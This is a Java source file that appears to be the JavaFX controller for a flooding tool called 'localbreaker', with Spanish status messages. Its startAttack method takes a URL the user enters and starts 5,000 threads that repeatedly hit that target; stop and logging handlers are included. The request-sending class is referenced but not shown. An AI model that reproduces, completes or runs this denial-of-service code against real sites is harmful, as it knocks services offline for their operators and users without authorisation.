package org.example.localbreaker;

import javafx.application.Platform;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class MainController {

    @FXML
    private TextField inputField;

    @FXML
    private TextArea terminalOutput;

    private final List<RequestThread> requestThreads = new ArrayList<>();
    private final List<Thread> threadList = new ArrayList<>();
    private boolean running = false;

    public void onExecuteButtonClick(ActionEvent actionEvent) throws MalformedURLException {
        if (!running) {
            startAttack(inputField.getText());
        } else {
            printToTerminal("El ataque ya está en ejecución.");
        }
    }

    public void startAttack(String urlStr) throws MalformedURLException {
        running = true;
        URL url = new URL(urlStr);
        int numThreads = 5000;
        printToTerminal("Atacando IP: " + urlStr);

        for (int i = 0; i < numThreads; i++) {
            RequestThread requestThread = new RequestThread(url);
            Thread thread = new Thread(requestThread);
            requestThreads.add(requestThread);
            threadList.add(thread);
            thread.start();
        }
    }

    public void onStopButtonClick(ActionEvent actionEvent) {
        if (!running) {
            printToTerminal("No hay un ataque en ejecución.");
            return;
        }

        for (RequestThread rt : requestThreads) {
            rt.stopRunning();
        }

        for (Thread thread : threadList) {
            try {
                thread.join();
            } catch (InterruptedException e) {
                printToTerminal("Error deteniendo hilo: " + e.getMessage());
            }
        }

        requestThreads.clear();
        threadList.clear();
        running = false;
        printToTerminal("Ataque detenido.");
    }

    private void printToTerminal(String message) {
        Platform.runLater(() -> terminalOutput.appendText(message + "\n"));
    }
}
